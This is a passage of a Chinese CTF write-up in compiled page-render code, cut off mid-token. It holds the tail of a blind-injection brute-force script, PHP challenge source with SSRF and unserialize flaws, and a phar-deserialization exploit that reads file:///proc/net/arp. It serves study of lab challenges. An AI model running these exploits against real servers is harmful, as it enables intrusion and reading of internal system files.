"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n                "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"username"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'\\\\'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("\n                "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"passwd"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("payload\n            "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n            "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#print data")]),s._v("\n            req"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("requests"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("post"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("url"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("data"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("data"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("allow_redirects"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token boolean"}},[s._v("False")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n            "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),s._v(" req"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("status_code"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("200")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("and")]),s._v(" req"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("status_code"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("302")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n                "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("continue")]),s._v(" \n            "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),s._v(" req"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("status_code"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("302")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n                ret"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("ret"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v("ch\n                sys"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("stdout"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("write"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"[-]Result : -> {0} <-\\r"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("format")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("ret"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n                sys"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("stdout"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("flush"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n                "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("break")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"[+]Result : ->"')]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v("ret"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"<-"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br")])]),a("h2",{attrs:{id:"_0x04-phar-matches-everything-赛后复现"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x04-phar-matches-everything-赛后复现"}},[s._v("#")]),s._v(" 0x04 phar matches everything (赛后复现)")]),s._v(" "),a("p",[s._v("...原题可以拿到源码，但似乎buuoj上不行")]),s._v(" "),a("p",[s._v("能拿到的源码是cathmine.php")]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token php language-php"}},[a("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("<?php")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("class")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token class-name-definition class-name"}},[s._v("Easytest")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("protected")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$test")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("public")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("function")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function-definition function"}},[s._v("funny_get")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("return")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$this")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("->")]),a("span",{pre:!0,attrs:{class:"token property"}},[s._v("test")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("class")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token class-name-definition class-name"}},[s._v("Main")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("public")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$url")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("public")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("function")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function-definition function"}},[s._v("curl")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$url")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$ch")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("curl_init")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("  \n        "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("curl_setopt")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$ch")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token constant"}},[s._v("CURLOPT_URL")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$url")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("curl_setopt")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$ch")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token constant"}},[s._v("CURLOPT_RETURNTRANSFER")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token constant boolean"}},[s._v("true")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$output")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("curl_exec")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$ch")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("curl_close")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$ch")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("return")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$output")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n\n\t"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("public")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("function")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function-definition function"}},[s._v("__destruct")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$this_is_a_easy_test")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("unserialize")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_GET")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'careful'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$this_is_a_easy_test")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("->")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("funny_get")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("===")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'1'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n            "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$this")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("->")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("curl")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$this")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("->")]),a("span",{pre:!0,attrs:{class:"token property"}},[s._v("url")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("    \n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("isset")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_POST")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"submit"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$check")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("getimagesize")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_POST")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'name'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$check")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!==")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token constant boolean"}},[s._v("false")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"File is an image - "')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$check")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"mime"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"."')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("else")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"File is not an image."')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("?>")])]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br"),a("span",{staticClass:"line-number"},[s._v("28")]),a("br"),a("span",{staticClass:"line-number"},[s._v("29")]),a("br"),a("span",{staticClass:"line-number"},[s._v("30")]),a("br"),a("span",{staticClass:"line-number"},[s._v("31")]),a("br"),a("span",{staticClass:"line-number"},[s._v("32")]),a("br"),a("span",{staticClass:"line-number"},[s._v("33")]),a("br"),a("span",{staticClass:"line-number"},[s._v("34")]),a("br"),a("span",{staticClass:"line-number"},[s._v("35")]),a("br")])]),a("p",[s._v("这里藏了一个ssrf\n但是不能直接用这个php打，因为url不可控")]),s._v(" "),a("p",[s._v("判断文件类型使用了getimageinfo，所以可以搞phar的反序列化，这里很明显要我们SSRF，首先读下"),a("code",[s._v("file:///proc/net/arp")])]),s._v(" "),a("p",[s._v("Exp")]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token php language-php"}},[a("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("<?php")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("class")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token class-name-definition class-name"}},[s._v("Easytest")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("protected")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$test")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'1'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("public")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("function")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function-definition function"}},[s._v("funny_get")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("return")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$this")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("->")]),a("span",{pre:!0,attrs:{class:"token property"}},[s._v("test")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("class")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token class-name-definition class-name"}},[s._v("Main")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("public")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$url")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n\n\n"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$test")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("new")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("EasyTest")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("urlencode")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("serialize")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$test")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"\\n"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$payload")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("new")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("Main")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$payload")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("->")]),a("span",{pre:!0,attrs:{class:"token property"}},[s._v("url")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"file:///proc/net/arp"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$png_header")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("hex2bin")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'89504e470d0a1a0a0000000d49484452000000400000004000'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$phar")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("new")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("Phar")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'exp.phar'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$phar")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("->")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("startBuffering")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$phar")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("->")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("setStub")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$png_header")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'<?php __HALT_COMPILER();?>'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("   "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//设置 stub，增加 gif 文件头")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$phar")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("->")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("addFromString")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'test.txt'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'test'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//添加要压缩的文件")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$phar")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("->")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("setMetadata")]),a("span",{pre:!0,attrs:{class:"token 